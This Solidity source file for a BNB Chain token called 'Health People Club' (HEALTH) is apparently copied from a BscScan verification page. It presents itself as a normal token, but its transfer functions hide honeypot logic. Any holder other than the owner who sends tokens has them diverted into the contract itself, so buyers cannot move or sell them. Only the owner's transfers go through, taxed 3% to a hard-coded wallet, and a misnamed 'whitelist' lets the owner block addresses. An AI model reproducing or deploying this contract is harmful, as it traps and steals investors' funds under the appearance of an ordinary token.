/**
 *Submitted for verification at BscScan.com on 2023-08-25
*/

/**

 *TG:https://t.me/
 *Website:http://www.health-people.club

██╗  ██╗███████╗ █████╗ ██╗     ████████╗██╗  ██╗
██║  ██║██╔════╝██╔══██╗██║     ╚══██╔══╝██║  ██║
███████║█████╗  ███████║██║        ██║   ███████║
██╔══██║██╔══╝  ██╔══██║██║        ██║   ██╔══██║
██║  ██║███████╗██║  ██║███████╗   ██║   ██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract HEALTHToken {
    string public name = "Health People Club";
    string public symbol = "HEALTH";
    uint256 public totalSupply = 10**9 * 10**18;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;
    address public taxWallet = 0x739e454bA58E7e39F6929b6601FCB5B03C74b4df;
    bool public isBlackholeEnabled = true;
    uint256 public transferDelay = 3 days; // 转移延迟为3天

    mapping(address => bool) private whitelist;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address to, uint256 value) external {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");

        if (msg.sender == owner || to == owner) {
            _transfer(msg.sender, to, value);
        } else {
            require(!whitelist[msg.sender], "Sender is whitelisted");
            require(!whitelist[to], "Receiver is whitelisted");

            balanceOf[msg.sender] -= value;
            balanceOf[address(this)] += value;

            emit Transfer(msg.sender, address(this), value);
        }
    }

    function transferFrom(address from, address to, uint256 value) external {
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Insufficient allowance");

        if (from == owner || to == owner) {
            _transfer(from, to, value);
        } else {
            require(!whitelist[from], "Sender is whitelisted");
            require(!whitelist[to], "Receiver is whitelisted");

            balanceOf[from] -= value;
            balanceOf[address(this)] += value;

            emit Transfer(from, address(this), value);
        }

        allowance[from][msg.sender] -= value;
    }

    function approve(address spender, uint256 value) external {
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
    }

    function calculateTax(uint256 value) internal pure returns (uint256) {
        if (value >= 20 * 10**4 * 10**18) {
            return value * 3 / 100;
        } else {
            return 0;
        }
    }

    function _transfer(address from, address to, uint256 value) internal {
        if (isBlackholeEnabled) {
            uint256 tax = calculateTax(value);
            uint256 taxedValue = value - tax;

            balanceOf[from] -= value;
            balanceOf[to] += taxedValue;
            balanceOf[taxWallet] += tax;

            emit Transfer(from, to, taxedValue);
            emit Transfer(from, taxWallet, tax);
        } else {
            balanceOf[from] -= value;
            balanceOf[to] += value;

            emit Transfer(from, to, value);
        }
    }

    function isWhitelisted(address account) public view returns (bool) {
        return whitelist[account];
    }

    function addToWhitelist(address account) external onlyOwner {
        whitelist[account] = true;
    }

    function removeFromWhitelist(address account) external onlyOwner {
        whitelist[account] = false;
    }
}